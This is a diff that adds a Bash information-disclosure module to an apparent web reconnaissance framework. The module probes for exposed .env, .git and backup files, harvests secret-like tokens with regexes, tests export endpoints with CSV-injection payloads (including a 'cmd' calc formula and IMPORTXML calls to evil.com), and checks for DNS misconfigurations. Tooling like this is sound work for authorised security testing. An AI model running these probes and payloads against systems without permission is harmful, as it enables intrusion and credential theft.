@@ -1,0 +1,634 @@
+# ============================================================
+# Recon Framework - Information Disclosure Module
+# ============================================================
+
+# Paths that commonly leak sensitive information
+readonly ERROR_PATHS=(
+    "/trace.axd" "/webtrace.axd" "/elmah.axd" "/aspxerror.aspx"
+    "/.env" "/.git/config" "/.svn/entries" "/web.config"
+    "/.git/HEAD" "/.git/objects" "/.git/hooks" "/.git/logs"
+    "/backup" "/backup.zip" "/backup.tar.gz" "/backup.sql"
+    "/config" "/config.php" "/config.yml" "/config.json"
+    "/.htaccess" "/.htpasswd" "/.bash_history" "/.mysql_history"
+    "/server-status" "/server-info" "/phpinfo.php" "/info.php"
+    "/actuator/env" "/actuator/health" "/actuator/trace" "/actuator/httptrace"
+    "/jolokia" "/prometheus" "/metrics"
+    "/robots.txt" "/sitemap.xml" "/sitemap_index.xml"
+)
+
+
+# Detect catch-all 200 (server returns 200 for any path)
+is_catchall_200() {
+    local base_url="$1"
+    local test_paths=("/__recon_test_xyz_123" "/__recon_test_abc_456" "/__nonexistent_path_789")
+    local catchall_count=0
+    for tp in "${test_paths[@]}"; do
+        local code
+        code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 3 "${base_url}${tp}" 2>/dev/null || echo "000")
+        [[ "$code" == "200" ]] && catchall_count=$((catchall_count + 1))
+    done
+    [[ "$catchall_count" -ge 2 ]] && return 0 || return 1
+}
+
+# Verify .env file has real content (not just catch-all 200)
+verify_env_content() {
+    local url="$1"
+    local body
+    body=$(curl -sk --max-time 5 "$url" 2>/dev/null | head -c 2000)
+    # Real .env files have KEY=value patterns, not HTML
+    echo "$body" | grep -qiE '<html|<!doctype|<head|<body' && return 1
+    # Must look like env/config: KEY=value with real secret-like values
+    # Reject generic HTML pages that happen to contain one KEY=value line.
+    # Require at least 2 env-like lines OR a known sensitive key name.
+    local env_lines
+    env_lines=$(echo "$body" | grep -cE '^[A-Z_][A-Z0-9_]*=' 2>/dev/null || echo 0)
+    if [[ "$env_lines" -ge 2 ]]; then
+        return 0
+    fi
+    # Single-line env with a sensitive key name is also valid
+    echo "$body" | grep -qiE '^(DB_|DATABASE_|MYSQL_|POSTGRES_|REDIS_|MONGO_|AWS_|SECRET|API_KEY|PRIVATE|TOKEN|PASSWORD|MAIL|SMTP)=' && return 0
+    # JSON config with secret-looking keys
+    echo "$body" | grep -qiE '"(password|secret|api[_-]?key|token|private[_-]?key)"\s*:\s*"[^"]{8,}"' && return 0
+    return 1
+}
+
+# Verify .git file has real content
+verify_git_content() {
+    local url="$1"
+    local body
+    body=$(curl -sk --max-time 5 "$url" 2>/dev/null | head -c 500)
+    # Real .git/HEAD contains "ref: refs/heads/" or commit hashes
+    echo "$body" | grep -qE '<html|<!doctype|<head' && return 1
+    echo "$body" | grep -qE 'ref: refs/heads/|^[0-9a-f]{40}$' && return 0
+    return 1
+}
+
+info_disclosure_scan() {
+    local target="$1"
+    local output_dir="$2"
+    local id_dir="$output_dir/info_disclosure"
+
+    mkdir -p "$id_dir"
+
+    # Initialize result files
+    local stacktraces="$id_dir/stacktraces.txt"
+    local env_files="$id_dir/env_files.txt"
+    local backup_files="$id_dir/backup_files.txt"
+    local git_exposure="$id_dir/git_exposure.txt"
+    local config_files="$id_dir/config_files.txt"
+    local dir_listing="$id_dir/dir_listing.txt"
+
+    : > "$stacktraces" : > "$env_files" : > "$backup_files"
+    : > "$git_exposure" : > "$config_files" : > "$dir_listing"
+
+    local base_url
+    [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    log_info "Checking for exposed sensitive files..."
+
+    # Parallel check of common paths -- unique tmp file per path to avoid race
+    local id_tmp_dir
+    id_tmp_dir=$(mktemp -d /tmp/.id_XXXXXX)
+    for path in "${ERROR_PATHS[@]}"; do
+        {
+            local hash
+            hash=$(echo "$path" | md5sum 2>/dev/null | cut -d' ' -f1 || echo "$RANDOM")
+            local tmp_out="$id_tmp_dir/$hash"
+
+            local code
+            code=$(curl -sk --max-time 8 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} -o "$tmp_out" -w '%{http_code}' "${base_url}${path}" 2>/dev/null || echo "000")
+            [[ "$code" != "200" ]] && { rm -f "$tmp_out"; exit 0; }
+
+            local response
+            response=$(cat "$tmp_out" 2>/dev/null || true)
+            rm -f "$tmp_out"
+
+            # Check for stack trace patterns
+            if echo "$response" | grep -qiE 'stack trace|exception details|at [a-z_].*\.(cs|java|py|php|rb):[0-9]+|traceback|system\.web|asp\.net'; then
+                echo "[STACKTRACE] ${base_url}${path}" >> "$stacktraces"
+                log_vuln "Stack trace found: $path"
+            fi
+
+            # A styled HTML page is almost always a soft-404, not the raw artifact.
+            # Detect BEFORE any checks that depend on is_html (avoids using undefined var).
+            local is_html=0
+            echo "$response" | grep -qiE '<html|<!doctype html|<body' && is_html=1
+
+            # Check for .env exposure (path ends with .env)
+            if [[ "$path" == *"/.env" ]] && [[ "$is_html" -eq 0 ]]; then
+                if echo "$response" | grep -qE '^[A-Z_]+=.+'; then
+                    # Verify it's not a catch-all 200
+                    if ! is_catchall_200 "$base_url" && verify_env_content "${base_url}${path}"; then
+                        echo "[ENV EXPOSURE] ${base_url}${path}" >> "$env_files"
+                        log_vuln ".env file exposed"
+                    fi
+                fi
+            fi
+
+            # Check for .git or .svn exposure — require real VCS file structure AND content verification
+            if [[ "$path" == *"/.git/"* || "$path" == *"/.svn/"* ]] && [[ "$is_html" -eq 0 ]]; then
+                if echo "$response" | grep -qiE '\[core\]|repositoryformatversion|ref:[[:space:]]*refs/|^[0-9]+$|dir$|svn:'; then
+                    # Verify not catch-all 200
+                    if ! is_catchall_200 "$base_url"; then
+                        echo "[VCS EXPOSURE] ${base_url}${path}" >> "$git_exposure"
+                        log_vuln "Version control exposure: $path"
+                    fi
+                fi
+            fi
+
+            # Check for backup files — must be sizable AND not an HTML error page.
+            if echo "$path" | grep -qE '(backup|bak|old|sql|dump)'; then
+                if [[ "$is_html" -eq 0 && ${#response} -gt 1000 ]]; then
+                    echo "[BACKUP] ${base_url}${path}" >> "$backup_files"
+                    log_vuln "Potential backup file: $path"
+                fi
+            fi
+
+            # Check for config files — require KEY=value / structured secrets, not just
+            # the word "password" (which appears on ordinary login pages).
+            if [[ "$is_html" -eq 0 ]] && echo "$response" | grep -qiE '^[[:space:]]*[A-Za-z0-9_.-]+[[:space:]]*[:=][[:space:]]*.*(password|secret|api[_-]?key|passwd|token)|(DB_|DATABASE_|MYSQL_|POSTGRES_)[A-Z]+[[:space:]]*='; then
+                echo "[CONFIG] ${base_url}${path}" >> "$config_files"
+                log_vuln "Config file with secrets: $path"
+            fi
+
+            # Check for directory listing
+            if echo "$response" | grep -qiE 'Index of /|Parent Directory|<title>Directory listing for'; then
+                echo "[DIR LISTING] ${base_url}${path}" >> "$dir_listing"
+                log_vuln "Directory listing enabled: $path"
+            fi
+        } &
+
+        # Limit parallel jobs — use wait -n when available (Bash 4.3+) for
+        # reliable tracking, otherwise fall back to a sleep-based throttle.
+        if [[ $(jobs -r | wc -l) -ge 15 ]]; then
+            wait -n 2>/dev/null || sleep 0.5
+        fi
+    done
+
+    # Wait for all background jobs
+    wait 2>/dev/null || true
+    rm -rf "$id_tmp_dir"
+
+    # ─── Robots.txt Analysis ───────────────────────────────────
+    log_info "Analyzing robots.txt..."
+    local robots_file="$id_dir/robots_analysis.txt"
+    local robots_content
+    robots_content=$(curl -sk --max-time 8 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "${base_url}/robots.txt" 2>/dev/null)
+
+    if [[ -n "$robots_content" ]]; then
+        echo "$robots_content" > "$robots_file"
+
+        # Check for sensitive paths in robots.txt
+        echo "$robots_content" | grep -iE 'disallow:|allow:' | grep -iE '(admin|config|backup|secret|api|internal|\.env|\.git)' \
+            > "$id_dir/sensitive_robots.txt" 2>/dev/null || true
+
+        [[ -s "$id_dir/sensitive_robots.txt" ]] && \
+            log_vuln "Sensitive paths in robots.txt - check $id_dir/sensitive_robots.txt"
+    fi
+
+    # ─── Sitemap Analysis ──────────────────────────────────────
+    log_info "Analyzing sitemap(s)..."
+    local sitemap_urls
+    sitemap_urls=$(curl -sk --max-time 8 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "${base_url}/sitemap.xml" 2>/dev/null | \
+        grep -oE 'https?://[^<]+' | head -50)
+
+    [[ -n "$sitemap_urls" ]] && echo "$sitemap_urls" > "$id_dir/sitemaps.txt"
+
+    local sitemap_count
+    sitemap_count=$(safe_count "$id_dir/sitemaps.txt")
+    [[ "$sitemap_count" -gt 0 ]] && log_ok "Found $sitemap_count URLs in sitemap"
+
+    # ─── Server Banner Disclosure ───────────────────────────────
+    log_info "Checking server banner disclosure..."
+    local headers
+    headers=$(curl -sI --max-time 10 "${base_url}" 2>/dev/null)
+
+    echo "$headers" | grep -iE '^(Server|X-Powered-By|X-AspNet-Version|X-AspNetMvc-Version):' \
+        > "$id_dir/server_banner.txt" 2>/dev/null || true
+
+    if [[ -s "$id_dir/server_banner.txt" ]]; then
+        # CDN/proxy banners (cloudflare, akamai, fastly, etc.) are not real origin
+        # server disclosures — skip the vuln flag to avoid false positives.
+        local banner_val
+        banner_val=$(cat "$id_dir/server_banner.txt" | tr '[:upper:]' '[:lower:]')
+        if echo "$banner_val" | grep -qiE 'cloudflare|akamai|fastly|nginx/|apache/|x-powered-by:|iis/'; then
+            if echo "$banner_val" | grep -qiE 'cloudflare'; then
+                log_info "Server: cloudflare (CDN edge — not an origin banner leak, skipping)"
+            else
+                log_vuln "Server banner disclosure detected"
+                cat "$id_dir/server_banner.txt"
+            fi
+        fi
+    fi
+
+    # ─── Source Map Detection ───────────────────────────────────
+    log_info "Checking for JavaScript source maps..."
+    if [[ -f "$output_dir/js_analysis/js_files.txt" ]]; then
+        while read -r jsfile; do
+            [[ -z "$jsfile" ]] && continue
+            local map_file="${jsfile%.js}.map"
+            # Require actual source-map JSON, not just any 200 (soft-404 pages return 200).
+            if fp_confirm_content "$map_file" '"version"[[:space:]]*:[[:space:]]*3|"sources"[[:space:]]*:|"mappings"[[:space:]]*:'; then
+                echo "[JS MAP] $map_file" >> "$id_dir/js_maps.txt"
+                record_finding "source_map" "medium" "CONFIRMED" "$map_file" "source map exposed"
+            fi
+        done < "$output_dir/js_analysis/js_files.txt"
+    fi
+
+    # Summary
+    echo "$id_dir"
+}
+
+# Check for hardcoded secrets in JS/content
+detect_secrets() {
+    local content_dir="$1"
+    local output_dir="$2"
+
+    mkdir -p "$output_dir"
+
+    log_info "Scanning for exposed secrets (regex + entropy analysis)..."
+
+    local fetched_content="$content_dir/fetched_content.txt"
+    [[ -f "$fetched_content" ]] || return
+
+    # AWS keys
+    grep -aoiE 'AKIA[0-9A-Z]{16}' "$fetched_content" 2>/dev/null | sort -u > "$output_dir/aws_keys.txt" || true
+
+    # Google API keys
+    grep -aoiE 'AIza[0-9A-Za-z_-]{35}' "$fetched_content" 2>/dev/null | sort -u > "$output_dir/google_keys.txt" || true
+
+    # Slack tokens
+    grep -aoiE 'xox[baprs]-[a-zA-Z0-9-]{10,40}' "$fetched_content" 2>/dev/null | sort -u > "$output_dir/slack_tokens.txt" || true
+
+    # GitHub tokens
+    grep -aoiE '[GH]itHub[Pp]at_[0-9A-Za-z_]{30,}|ghp_[0-9A-Za-z]{30,}' "$fetched_content" 2>/dev/null | sort -u > "$output_dir/github_tokens.txt" || true
+
+    # Stripe keys
+    grep -aoiE 'sk_live_[0-9a-zA-Z]{24,}|rk_live_[0-9a-zA-Z]{24,}' "$fetched_content" 2>/dev/null | sort -u > "$output_dir/stripe_keys.txt" || true
+
+    # Generic key=value patterns
+    grep -aoiE '(api[_-]?key|secret|access[_-]?token|private[_-]?key|client[_-]?secret)["'\''\x27]?\s*[:=]\s*["'\''\x27]?[A-Za-z0-9/+_-]{16,}' \
+        "$fetched_content" 2>/dev/null | sort -u > "$output_dir/generic_secrets.txt" || true
+
+    # Entropy-based detection
+    python3 - "$fetched_content" "$output_dir/entropy_hits.txt" <<'PYENTROPY'
+import sys, re, math
+
+def shannon(s):
+    if not s: return 0
+    ent = 0
+    for x in set(s):
+        p = s.count(x) / len(s)
+        if p > 0: ent += -p * math.log(p, 2)
+    return ent
+
+common = {'the','and','for','are','but','not','you','all','can','her','was','one','our',
+          'out','day','get','has','him','his','how','its','may','new','now','old','see',
+          'two','way','who','boy','did','man','men','put','too','end','why','let','own',
+          'run','big','she','use','this','that','with','from','have','they','your','will'}
+
+hits = set()
+try:
+    for tok in re.findall(r'[A-Za-z0-9_-]{20,}', open(sys.argv[1]).read()):
+        tl = tok.lower()
+        if tl in common: continue
+        if any(w in tl for w in ['key','secret','token','api','pass','auth','cred','priv','bearer']):
+            if len(tok) >= 24 and shannon(tok) >= 3.5:
+                hits.add(tok[:120])
+except: pass
+open(sys.argv[2], 'w').write('\n'.join(sorted(hits)))
+PYENTROPY
+
+    local total_hits=0
+    for f in "$output_dir"/*.txt; do
+        [[ -s "$f" ]] && total_hits=$((total_hits + $(wc -l < "$f")))
+    done
+
+    [[ $total_hits -gt 0 ]] && log_vuln "Secrets found: $total_hits → $output_dir" || log_ok "No exposed secrets detected"
+}
+# Error exposure and debug page detection
+error_exposure_scan() {
+    local target="$1"
+    local output_dir="$2"
+    local id_dir="$output_dir/info_disclosure"
+    mkdir -p "$id_dir"
+
+    local base_url
+    [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    log_info "Checking for ASP.NET debug pages and trace endpoints..."
+
+    local trace_file="$id_dir/debug_pages.txt"
+    : > "$trace_file"
+
+    # ASP.NET specific debug/trace paths
+    local debug_paths
+    debug_paths="trace.axd webtrace.axd elmah.axd aspxerror.aspx errorpage.aspx 500.aspx debug.aspx elmah.axd"
+    for path in $debug_paths; do
+        local tmp_err
+        tmp_err=$(mktemp /tmp/.err_XXXXXX)
+        local code
+        code=$(curl -sk --max-time 8 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} -o "$tmp_err" -w '%{http_code}' "${base_url}/${path}" 2>/dev/null || echo "000")
+        [[ "$code" != "200" ]] && { rm -f "$tmp_err"; continue; }
+        
+        # Verify this is actual debug content, not catch-all 200
+        local resp_body
+        resp_body=$(cat "$tmp_err" 2>/dev/null | head -c 2000)
+        
+        # Check if it's a catch-all 200 (returns main HTML page for any path)
+        if is_catchall_200 "$base_url"; then
+            log_info "Skipping ${base_url}/${path} - catch-all 200 (not a real debug endpoint)"
+            rm -f "$tmp_err"
+            continue
+        fi
+        
+        # Check if the content looks like a real debug page (not just main HTML)
+        if echo "$resp_body" | grep -qiE 'stack trace|exception|debug|trace|elmah|axd|error.*page|diagnostic|diagnostics'; then
+            echo "[DEBUG/TRACE] ${base_url}/${path} (HTTP $code)" >> "$trace_file"
+            log_vuln "Debug/trace endpoint exposed: ${base_url}/${path}"
+            
+            # Check for stack trace in response body
+            echo "$resp_body" | grep -qiE 'stack trace|exception details|at [a-z_]+\.[a-zA-Z]|traceback|error in' && \
+                echo "[STACKTRACE] ${base_url}/${path} - stack trace found" >> "$id_dir/stacktraces.txt"
+        else
+            log_info "Skipping ${base_url}/${path} - returns main HTML page (not real debug content)"
+        fi
+        rm -f "$tmp_err"
+    done
+
+    # Internal server error detection (probe for 500 pages that leak info)
+    log_info "Probing for error pages that leak information..."
+    local error_probe_file="$id_dir/error_probe.txt"
+    : > "$error_probe_file"
+
+    local error_triggers
+    error_triggers="/?__debug=1 /?debug=1 /?__error=1 /nonexistent_page_xyz_123 /api/v2/nonexistent"
+    for trigger in $error_triggers; do
+        local tmp_trigger
+        tmp_trigger=$(mktemp /tmp/.trg_XXXXXX)
+        local resp_headers
+        resp_headers=$(curl -sk -D - -o "$tmp_trigger" --max-time 8 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "${base_url}${trigger}" 2>/dev/null || true)
+        local resp_body
+        resp_body=$(cat "$tmp_trigger" 2>/dev/null || true)
+        rm -f "$tmp_trigger"
+        local code
+        code=$(echo "$resp_headers" | grep -oE 'HTTP/[0-9.]+ [0-9]{3}' | tail -1 | awk '{print $2}')
+
+        if [[ "$code" == "500" ]]; then
+            echo "[INTERNAL SERVER ERROR] ${base_url}${trigger}" >> "$error_probe_file"
+            # Specific framework stack-trace / path-disclosure signatures only.
+            # The old pattern (error|warning|path.*[a-z]|file.*[a-z]) matched almost any page.
+            echo "$resp_body" | grep -qiE 'Traceback \(most recent call last\)|at [a-zA-Z0-9_.$]+\([A-Za-z0-9_]+\.(java|kt):[0-9]+\)|System\.[A-Za-z.]+Exception|\.php on line [0-9]+|in /(var|home|srv|app)/[^ ]+\.(php|py|rb) on line|Stack trace:|/[a-z]+/[a-z0-9_/]+\.(rb|py|php):[0-9]+:in|ORA-[0-9]{5}|SQLSTATE\[' && \
+                log_vuln "Error page reveals internal details: ${base_url}${trigger}"
+        fi
+    done
+
+    local debug_count
+    debug_count=$(safe_count "$trace_file")
+    [[ "$debug_count" -gt 0 ]] && log_ok "Debug/error exposures: $debug_count" || log_ok "No obvious debug page exposures"
+}
+
+# ─── CSV Injection Detection ──────────────────────────────────
+# Checks for CSV injection in export endpoints
+csv_injection_check() {
+    local target="$1"
+    local output_dir="$2"
+    local inj_dir="$output_dir/injection"
+    mkdir -p "$inj_dir"
+
+    local base_url
+    [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    log_info "Testing CSV injection on export endpoints..."
+
+    local csv_file="$inj_dir/csv_injection.txt"
+    : > "$csv_file"
+
+    # CSV injection payloads
+    local csv_payloads=(
+        "=1+1"
+        "=2+5"
+        "=cmd|'/C calc'!A0"
+        "=HYPERLINK(\"http://evil.com/\",\"Click\")"
+        "=IMPORTXML(\"http://evil.com/\",\"//a/@href\")"
+        "@SUM(1+1)"
+        "+1+1"
+        "-1+1"
+        "|1+1"
+    )
+
+    # Find export/download endpoints
+    local endpoints_file="$output_dir/endpoints/all_endpoints.txt"
+    [[ -f "$endpoints_file" ]] || return
+
+    grep -iE '/(export|download|csv|report|generate)' "$endpoints_file" 2>/dev/null | head -3 > "$inj_dir/export_endpoints.txt"
+
+    if [[ ! -s "$inj_dir/export_endpoints.txt" ]]; then
+        # Also check parameter names
+        grep -iE '[?&](format|export|download|csv|output)=' "$endpoints_file" 2>/dev/null | head -3 > "$inj_dir/export_endpoints.txt"
+    fi
+
+    while read -r endpoint; do
+        [[ -z "$endpoint" ]] && continue
+        local base="${endpoint%%\?*}"
+        local query="${endpoint#*\?}"
+
+        for payload in "${csv_payloads[@]}"; do
+            for param in $(echo "$query" | tr '&' '\n' | cut -d'=' -f1 | sort -u); do
+                [[ -z "$param" ]] && continue
+                local test_query=$(echo "$query" | sed "s|$param=[^&]*|$param=$(echo "$payload" | sed 's/ /%20/g' | sed 's/|/%7C/g' | sed 's/=/\\=/g')|g")
+                local test_url="${base}?${test_query}"
+
+                local resp
+                resp=$(curl -sk --max-time 10 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$test_url" 2>/dev/null | head -c 5000)
+
+                # Use fixed-string grep (-F) not regex (-E) to avoid the shell-escaped
+                # payload pattern breaking on metacharacters like | in CSV payloads.
+                if echo "$resp" | grep -qF "$payload"; then
+                    echo "[CSV INJECTION] param=$param payload=$payload -> $test_url" >> "$csv_file"
+                    log_vuln "CSV injection reflected in export: $param"
+                    break 2
+                fi
+            done
+        done
+    done < "$inj_dir/export_endpoints.txt"
+
+    local csv_hits
+    csv_hits=$(safe_count "$csv_file")
+    [[ "$csv_hits" -gt 0 ]] && log_vuln "CSV injection findings: $csv_hits" || log_ok "No CSV injection detected"
+}
+
+# ─── Content Spoofing Detection ───────────────────────────────
+# Tests if attacker-controlled content can be reflected
+content_spoofing_check() {
+    local target="$1"
+    local output_dir="$2"
+    local spoof_dir="$output_dir/content_spoofing"
+    mkdir -p "$spoof_dir"
+
+    local base_url
+    [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    log_info "Testing content spoofing..."
+
+    local spoof_file="$spoof_dir/content_spoofing.txt"
+    : > "$spoof_file"
+
+    local endpoints_file="$output_dir/endpoints/all_endpoints.txt"
+    [[ -f "$endpoints_file" ]] || return
+
+    # Find pages that reflect user input
+    grep -iE '[?&](q|search|query|term|keyword|msg|message|text|content|body|id|name|title|url|redirect|dest|return)=' "$endpoints_file" 2>/dev/null | head -30 > "$spoof_dir/reflective_params.txt"
+
+    local spoof_payload="CONTENT_SPOOF_TEST_$(date +%s)"
+
+    while read -r url; do
+        [[ -z "$url" ]] && continue
+        local base="${url%%\?*}"
+        local query="${url#*\?}"
+
+        IFS='&' read -ra pairs <<< "$query"
+        for i in "${!pairs[@]}"; do
+            local key="${pairs[$i]%%=*}"
+            [[ -z "$key" ]] && continue
+            local new_pairs=()
+            for j in "${!pairs[@]}"; do
+                [[ "$j" == "$i" ]] && new_pairs+=("${key}=${spoof_payload}") || new_pairs+=("${pairs[$j]}")
+            done
+            local test_url="${base}?$(IFS='&'; echo "${new_pairs[*]}")"
+            local resp
+            resp=$(curl -sk --max-time 8 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$test_url" 2>/dev/null)
+            if echo "$resp" | grep -q "$spoof_payload"; then
+                # Check if content-type allows HTML rendering
+                local ct
+                ct=$(curl -sk -I --max-time 5 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$test_url" 2>/dev/null | grep -i '^content-type:' | head -1)
+                echo "[CONTENT SPOOFING] param=$key -> $test_url (CT: ${ct:-unknown})" >> "$spoof_file"
+                log_vuln "Content spoofing via param '$key'"
+                break
+            fi
+        done
+    done < "$spoof_dir/reflective_params.txt"
+
+    local spoof_hits
+    spoof_hits=$(safe_count "$spoof_file")
+    [[ "$spoof_hits" -gt 0 ]] && log_vuln "Content spoofing findings: $spoof_hits" || log_ok "No content spoofing detected"
+}
+
+# ─── DNS Misconfiguration Checks ──────────────────────────────
+# Checks for common DNS misconfigurations
+dns_misconfig_check() {
+    local domain="$1"
+    local output_dir="$2"
+    local dns_dir="$output_dir/dns_misconfig"
+    mkdir -p "$dns_dir"
+
+    log_info "Checking DNS misconfigurations..."
+
+    local misconfig_file="$dns_dir/misconfigurations.txt"
+    : > "$misconfig_file"
+
+    # 1. Zone transfer attempt
+    log_info "  Checking zone transfer..."
+    for ns in $(safe_dig NS "$domain"); do
+        local axfr
+        axfr=$(dig @"$ns" AXFR "$domain" 2>/dev/null | grep -v '^;' | head -5)
+        if [[ -n "$axfr" ]] && echo "$axfr" | grep -qE 'IN\s+(A|AAAA|MX|NS|CNAME|TXT)'; then
+            echo "[ZONE TRANSFER] $ns allows AXFR for $domain" >> "$misconfig_file"
+            log_vuln "Zone transfer allowed on $ns"
+        fi
+    done
+
+    # 2. SPF/DMARC/DKIM checks
+    # NOTE: Subdomains are NOT required to have their own SPF/DMARC records.
+    # RFC 7208 (SPF) and RFC 7489 (DMARC) apply to the organisational/root domain.
+    # We check the scanned domain first, then fall back to the root domain so we
+    # don't flood reports with false-positive SPF/DMARC findings on subdomains.
+    log_info "  Checking SPF/DMARC/DKIM..."
+
+    # Derive root domain (strip leading labels, keep last two parts)
+    local root_domain
+    root_domain=$(echo "$domain" | awk -F. '{if(NF>2){print $(NF-1)"."$NF}else{print $0}}')
+
+    local spf_record
+    spf_record=$(safe_dig TXT "$domain" | grep -i "v=spf1" | head -1)
+    # If not on the subdomain itself, check the root domain before flagging
+    if [[ -z "$spf_record" && "$domain" != "$root_domain" ]]; then
+        spf_record=$(safe_dig TXT "$root_domain" | grep -i "v=spf1" | head -1)
+    fi
+    if [[ -z "$spf_record" ]]; then
+        echo "[MISSING SPF] No SPF record found for $domain (nor root $root_domain)" >> "$misconfig_file"
+        if [[ "$domain" != "$root_domain" ]]; then
+            log_info "No SPF on $domain (expected - inherits from root $root_domain)"
+        else
+            log_vuln "No SPF record for root domain $root_domain"
+        fi
+    elif ! echo "$spf_record" | grep -qE '(-all|~all)'; then
+        echo "[WEAK SPF] SPF record lacks -all or ~all: $spf_record" >> "$misconfig_file"
+        log_vuln "Weak SPF record: $spf_record"
+    fi
+
+    local dmarc_record
+    dmarc_record=$(safe_dig TXT "_dmarc.${domain}" | head -1)
+    # If not on the subdomain, check the root domain before flagging
+    if [[ -z "$dmarc_record" && "$domain" != "$root_domain" ]]; then
+        dmarc_record=$(safe_dig TXT "_dmarc.${root_domain}" | head -1)
+    fi
+    if [[ -z "$dmarc_record" ]]; then
+        echo "[MISSING DMARC] No DMARC record for _dmarc.$domain (nor _dmarc.$root_domain)" >> "$misconfig_file"
+        if [[ "$domain" != "$root_domain" ]]; then
+            log_info "No DMARC on $domain (expected - inherits from root $root_domain)"
+        else
+            log_vuln "No DMARC record for root domain $root_domain"
+        fi
+    elif ! echo "$dmarc_record" | grep -qi 'p=reject'; then
+        echo "[WEAK DMARC] DMARC policy not reject: $dmarc_record" >> "$misconfig_file"
+        log_vuln "Weak DMARC policy: $dmarc_record"
+    fi
+
+    # 3. Subdomain takeover check (common CNAMEs)
+    log_info "  Checking for dangling CNAMEs..."
+    [[ -f "$output_dir/dns_bruteforce/all_subdomains.txt" ]] || return
+
+    while read -r sub; do
+        [[ -z "$sub" ]] && continue
+        local cname
+        cname=$(safe_dig CNAME "$sub" | head -1)
+        if [[ -n "$cname" ]]; then
+            local cname_ip
+            cname_ip=$(safe_dig A "$cname" | head -1)
+            if [[ -z "$cname_ip" ]]; then
+                # A dangling CNAME to a known service is only exploitable if the service
+                # actually reports the resource as UNCLAIMED. Matching the CNAME alone
+                # produces heavy false positives (many live sites CNAME to these hosts),
+                # so we fetch the page and require a takeover fingerprint.
+                if echo "$cname" | grep -qiE 'github\.io|herokuapp\.com|s3\.amazonaws\.com|cloudfront\.net|azurewebsites\.net|netlify\.app|vercel\.app|pages\.dev|surge\.sh|readthedocs\.io|gitbook\.io|unbouncepages\.com|bigcartel\.com|bitbucket\.io|wpengine\.com|pantheon\.io|acquia\.com|platform\.sh|render\.com|fly\.io|railway\.app|cyclic\.app|koyeb\.app'; then
+                    local tk_body
+                    tk_body=$(curl -skg --max-time 8 "http://$sub" 2>/dev/null; curl -skg --max-time 8 "https://$sub" 2>/dev/null)
+                    local tk_fp='NoSuchBucket|The specified bucket does not exist|There isn.t a GitHub Pages site here|No such app|herokucdn|The requested URL was not found|project not found|Do you want to register|Repository not found|This page could not be found|domain.*not.*configured|Trying to access.*not found|NoSuchKey|is not a registered'
+                    if echo "$tk_body" | grep -qiE "$tk_fp"; then
+                        echo "[SUBDOMAIN TAKEOVER] $sub -> $cname (unclaimed-service fingerprint matched)" >> "$misconfig_file"
+                        record_finding "subdomain_takeover" "high" "CONFIRMED" "$sub" "unclaimed service $cname"
+                    else
+                        echo "[REVIEW: dangling CNAME] $sub -> $cname (no takeover fingerprint; verify manually)" >> "$misconfig_file"
+                        log_warn "Dangling CNAME (unconfirmed): $sub -> $cname"
+                    fi
+                fi
+            fi
+        fi
+    done < "$output_dir/dns_bruteforce/all_subdomains.txt"
+
+    # 4. Wildcard DNS check
+    log_info "  Checking wildcard DNS..."
+    local random_sub="wildcard-test-$(date +%s | sha256sum | head -c 12).$domain"
+    local wildcard_ip
+    wildcard_ip=$(safe_dig A "$random_sub" | head -1)
+    if [[ -n "$wildcard_ip" ]]; then
+        echo "[WILDCARD DNS] $domain resolves random subdomain to $wildcard_ip" >> "$misconfig_file"
+        log_vuln "Wildcard DNS detected on $domain"
+    fi
+
+    local misconfig_count
+    misconfig_count=$(safe_count "$misconfig_file")
+    [[ "$misconfig_count" -gt 0 ]] && log_vuln "DNS misconfigurations: $misconfig_count" || log_ok "No DNS misconfigurations detected"
+}
+
